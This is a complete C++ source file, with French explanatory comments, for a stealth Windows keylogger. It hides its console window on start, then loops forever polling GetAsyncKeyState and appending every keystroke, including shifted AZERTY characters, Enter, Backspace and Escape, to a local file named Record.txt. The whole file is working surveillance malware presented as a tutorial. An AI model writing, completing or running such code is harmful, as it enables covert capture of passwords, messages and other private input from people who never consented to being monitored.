#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

void hide ()
{
     HWND stealth; // Une fenêtre Windows est toujours identifiée par un "Window handle" (HWND). On instancie ici un objet HWND pour pouvoir ensuite récupérer le handle de la fenêtre qu'on veut cacher.
     AllocConsole(); // Alloue une nouvelle console au processus en cours. Un processus ne peut avoir qu'une console allouée. Si l'opération échoue, la valeur retournée vaut 0.
     stealth = FindWindowA("ConsoleWindowClass", NULL); // Récupère le "handle" de la fenêtre passée en paramètre. 
     ShowWindow(stealth, 0); // cache la fenêtre en cours et en attribue une autre
}
void log ()
{
     char key;

     for (;;)  // boucle infinie
     {    
          Sleep(25); // afin de ne pas utiliser toutes les ressources du CPU. Omettre cette ligne peut causer au ralentissement du système d'exploitation

          for(key=8; key <= 222; key++) // nous-nous intéressons à la table ASCII et plus précisément aux valeurs allant de 8 à 222
          {
               if (GetAsyncKeyState(key) == -32767) // GetAsyncKeyState() est une routine d'interruption système qui surveille l'appui sur une touche au clavier
               {
                    ofstream write ("Record.txt", ios::app); // ios::app: mode d'ouverture 'app' (append). Ajout des éléments en fin de fichier 
                    

                    if ((key>64) && (key<91) && !(GetAsyncKeyState(0x10))) // 0x10 est la valeur hexadecimale de la touche [Shift]
                         
                    {
                         /* 
                         si la touche appuyée se situe entre 64 (A) et 90 
                         (Z) dans la table ASCII mais que Shift n'est pas 
                         appuyé, on  incrémente key de 32 pour sauvegarder 
                         une lettre minuscule. On ferme ensuite le fichier
                         */

                         key += 32;
                         write << key;
                         write.close();
                         break;
                    }


                    else if ((key > 64) && (key < 91))
                    {
                         /*
                         si la touche appuyée se situe entre 64 (A) et 90
                         (Z) dans la table ASCII mais que Shift est appuyé, 
                         on écrit la valeur  "immédiate" de key dans le fichier. 
                         On n'oublie pas de le fermer.
                         */
                         
                         write << key;
                         write.close();
                         break;
                    }


                    else
                    {
                         switch(key) // Ce switch traîte les caractères numériques/spéciaux du clavier. 
                         {    
                              case 58:
                              {
                                   if(GetAsyncKeyState(0x10)) 
                                   {
                                        write << "0";
                                   }

                                   else
                                   {
                                        write << "à";
                                   }
                              }
                              break;

                              case 57:
                              {
                                   if(GetAsyncKeyState(0x10))
                                   {
                                        write << "9";
                                   }

                                   else
                                   {
                                        write << "ç";
                                   }
                              }
                              break;
                            
                              case 56:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << "8";
                                   }

                                   else
                                   {
                                        write << "!";
                                   }
                              }
                              break;
                            
                              case 55:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << "7";
                                   }

                                   else
                                   {
                                        write << "è";
                                   }
                              }
                              break;
                            
                              case 54:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << "6";
                                   }

                                   else
                                   {
                                        write << "§";
                                   }
                              }
                              break;

                              case 53:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << "5";
                                   }

                                   else
                                   {
                                        write << "(";
                                   }
                              }
                              break;

                              case 52:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << "4";
                                   }

                                   else
                                   {
                                        write << "'";
                                   }
                              }
                              break;
                            
                              case 51:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << '3';
                                   }

                                   else
                                   {
                                        write << '"';
                                   }
                              }
                              break;
                            
                              case 50:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << "2";
                                   }

                                   else
                                   {
                                        write << "é";
                                   }
                              }
                              break;

                              case 49:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << "1";
                                   }

                                   else
                                   {
                                        write << "&";
                                   }
                              }
                              break;

                              case VK_SPACE:
                              {
                                   write << " ";
                              }
                              break;

                              case VK_RETURN:
                              {
                                   write << " \n";
                              }
                              break;

                              case VK_TAB:
                              {
                                   write << "     ";
                              }
                              break;

                              case VK_BACK:
                              {
                                   write << "<BackSpace>";
                              }
                              break;

                              case VK_ESCAPE:
                              {
                                   write << "<Esc>";
                              }
                              break;

                              case VK_DELETE:
                              {
                                   write << "<Delete>";
                              }
                              break;

                              default:
                                   write << key;
                         }
                    }
               }              
          }
     }

}

int main()
{
     hide();
     log();     
     return 0;
}
